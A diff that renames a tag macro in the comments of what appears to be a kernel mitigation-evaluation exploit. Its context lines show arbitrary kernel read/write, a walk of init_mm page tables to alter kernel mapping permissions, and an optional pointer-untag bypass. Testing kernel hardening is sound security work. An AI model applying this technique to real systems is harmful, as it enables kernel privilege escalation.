@@ -8,10 +8,10 @@
 // permissions of any kernel mapping.
 //
 // Under CONFIG_SDP_CACHE init_mm lives in the sdp cache and is only reachable
-// through the __tagone pointer __init_mm_ptr. Under CONFIG_SDP_PGTABLE every
+// through the __tag1 pointer __init_mm_ptr. Under CONFIG_SDP_PGTABLE every
 // page table page is allocated from a hidden pool that is kept out of the
 // linear mapping and mapped at a random kernel virtual address; the pool is
-// reachable only through the __tagone pointers mm_struct::pgd and
+// reachable only through the __tag1 pointers mm_struct::pgd and
 // sdp_pt_va_base, so each next-level physical address has to be translated
 // through the pool base instead of through the linear mapping.
 
@@ -61,7 +61,7 @@ struct arb_request {
 #define SDP_PT_POOL_MB 256
 #define SDP_PT_POOL_SIZE ((unsigned long)SDP_PT_POOL_MB << 20)
 
-// FZY: A plain load of a __tagone slot returns the pointer with its upper 16
+// FZY: A plain load of a __tag1 slot returns the pointer with its upper 16
 // bits cleared. Restoring the kernel VA prefix bypasses the mitigation, so set
 // this to 1 only to evaluate whether the rest of the steps work; at 0 (the
 // default) the walk fails on the protected pointer, which is the point.
@@ -99,7 +99,7 @@ static void arb_write(int fd, unsigned long addr, void *data, size_t size) {
   }
 }
 
-// FZY: Undo the masking a plain load applies to a __tagone slot
+// FZY: Undo the masking a plain load applies to a __tag1 slot
 static unsigned long untag(unsigned long val) {
 #if SDP_BYPASS_TAG
   return val | 0xFFFF000000000000UL;
@@ -194,7 +194,7 @@ int main(int argc, char *argv[]) {
   unsigned long target_va = strtoul(argv[4], NULL, 16);
 
   // Step 1: locate init_mm. Under CONFIG_SDP_CACHE it lives in the sdp cache
-  // and only the __tagone pointer __init_mm_ptr reaches it.
+  // and only the __tag1 pointer __init_mm_ptr reaches it.
   if (mode != 0) {
     unsigned long ptr_val;
     arb_read(fd, init_mm_addr, &ptr_val, sizeof(ptr_val));
@@ -205,7 +205,7 @@ int main(int argc, char *argv[]) {
   printf("[+] init_mm:         0x%lx\n", init_mm_addr);
 
   // Step 2: read init_mm.pgd, the root of the kernel page table. Under
-  // CONFIG_SDP_PGTABLE this field is __tagone and points into the hidden pool.
+  // CONFIG_SDP_PGTABLE this field is __tag1 and points into the hidden pool.
   unsigned long pgd_field = init_mm_addr + pgd_offset;
   unsigned long pgd_va;
   arb_read(fd, pgd_field, &pgd_va, sizeof(pgd_va));
@@ -219,7 +219,7 @@ int main(int argc, char *argv[]) {
   struct pt_map map = {0};
   if (mode != 0) {
     // Page tables are in the sdp pool, outside the linear mapping.
-    // sdp_pt_va_base is __tagone, sdp_pt_pa_base is useless without it.
+    // sdp_pt_va_base is __tag1, sdp_pt_pa_base is useless without it.
     unsigned long va_base_addr = strtoul(argv[5], NULL, 16);
     unsigned long pa_base_addr = strtoul(argv[6], NULL, 16);
     unsigned long va_base;
